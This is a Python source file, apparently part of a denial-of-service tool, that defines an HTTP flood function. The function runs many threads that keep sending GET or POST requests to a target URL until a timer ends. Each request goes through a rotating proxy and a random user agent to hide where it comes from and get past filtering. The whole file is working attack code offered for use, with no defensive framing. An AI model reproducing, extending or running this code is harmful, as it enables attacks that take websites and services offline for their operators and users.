import requests
import random
import threading
import time

from utils.proxy import get_random_proxy, remove_proxy
from utils.colors import color
from utils.validate import validate_input

# By Rayzer
def load_user_agents(path="user_agents.txt"):
    try:
        with open(path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except:
        return ["Mozilla/5.0"]

# By Rayzer
user_agents = load_user_agents()

# By Rayzer
def build_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

# By Rayzer
def http_flood(url, duration, use_post=False, thread_count=10):
    end_time = time.time() + duration
    success = [0]

    def attack():
        while time.time() < end_time:
            proxy = get_random_proxy()
            proxies = None
            if proxy:
                proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }

            try:
                headers = build_headers()
                if use_post:
                    requests.post(url, data={"a": "b"}, headers=headers, proxies=proxies, timeout=3)
                else:
                    requests.get(url, headers=headers, proxies=proxies, timeout=3)
                success[0] += 1
            except:
                if proxy:
                    print(color(f"[!] Proxy error: {proxy} removed", "red"))
                    remove_proxy(proxy)

    print(color(f"[*] Starting HTTP {'POST' if use_post else 'GET'} flood on {url}", "blue"))
    threads = [threading.Thread(target=attack) for _ in range(thread_count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(color(f"[+] Completed HTTP flood. Total requests sent: {success[0]}", "green"))